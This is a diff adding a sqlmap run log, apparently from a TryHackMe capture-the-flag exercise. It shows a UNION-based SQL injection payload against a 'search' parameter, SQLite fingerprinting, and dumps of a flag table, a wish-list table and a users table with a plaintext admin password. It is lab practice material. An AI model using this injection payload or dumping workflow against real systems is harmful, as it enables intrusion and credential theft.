@@ -1,0 +1,90 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.5.6#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:05:23 /2021-07-09/
+
+[20:05:23] [INFO] parsing HTTP request from 'req'
+[20:05:23] [INFO] loading tamper module 'space2comment'
+[20:05:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: search=paul' UNION ALL SELECT NULL,CHAR(113,122,98,113,113)||CHAR(74,114,85,113,73,83,70,105,102,100,81,119,68,77,120,83,81,103,98,105,107,71,115,81,121,98,65,82,67,98,116,104,121,103,97,89,80,101,117,102)||CHAR(113,112,112,106,113)-- SiHo
+---
+[20:05:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[20:05:25] [INFO] testing SQLite
+[20:05:25] [INFO] confirming SQLite
+[20:05:25] [INFO] actively fingerprinting SQLite
+[20:05:25] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[20:05:25] [INFO] sqlmap will dump entries of all tables from all databases now
+[20:05:25] [INFO] fetching tables for database: 'SQLite_masterdb'
+[20:05:25] [INFO] fetching columns for table 'hidden_table' 
+[20:05:25] [INFO] fetching entries for table 'hidden_table'
+Database: <current>
+Table: hidden_table
+[1 entry]
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| thmfox{All_I_Want_for_Christmas_Is_You} |
++-----------------------------------------+
+
+[20:05:25] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/home/devil/.local/share/sqlmap/output/10.10.143.189/dump/SQLite_masterdb/hidden_table.csv'
+[20:05:25] [INFO] fetching columns for table 'sequels' 
+[20:05:25] [INFO] fetching entries for table 'sequels'
+Database: <current>
+Table: sequels
+[22 entries]
++-------------+-----+----------------------------+
+| kid         | age | title                      |
++-------------+-----+----------------------------+
+| James       | 8   | shoes                      |
+| John        | 4   | skateboard                 |
+| Robert      | 17  | iphone                     |
+| Michael     | 5   | playstation                |
+| William     | 6   | xbox                       |
+| David       | 6   | candy                      |
+| Richard     | 9   | books                      |
+| Joseph      | 7   | socks                      |
+| Thomas      | 10  | 10 McDonalds meals         |
+| Charles     | 3   | toy car                    |
+| Christopher | 8   | air hockey table           |
+| Daniel      | 12  | lego star wars             |
+| Matthew     | 15  | bike                       |
+| Anthony     | 3   | table tennis               |
+| Donald      | 4   | fazer chocolate            |
+| Mark        | 17  | wii                        |
+| Paul        | 9   | github ownership           |
+| James       | 8   | finnish-english dictionary |
+| Steven      | 11  | laptop                     |
+| Andrew      | 16  | rasberry pie               |
+| Kenneth     | 19  | TryHackMe Sub              |
+| Joshua      | 12  | chair                      |
++-------------+-----+----------------------------+
+
+[20:05:25] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/home/devil/.local/share/sqlmap/output/10.10.143.189/dump/SQLite_masterdb/sequels.csv'
+[20:05:25] [INFO] fetching columns for table 'users' 
+[20:05:25] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[1 entry]
++------------------+----------+
+| password         | username |
++------------------+----------+
+| EhCNSWzzFP6sc7gB | admin    |
++------------------+----------+
+
+[20:05:25] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/devil/.local/share/sqlmap/output/10.10.143.189/dump/SQLite_masterdb/users.csv'
+[20:05:25] [INFO] fetched data logged to text files under '/home/devil/.local/share/sqlmap/output/10.10.143.189'
+
+[*] ending @ 20:05:25 /2021-07-09/
+
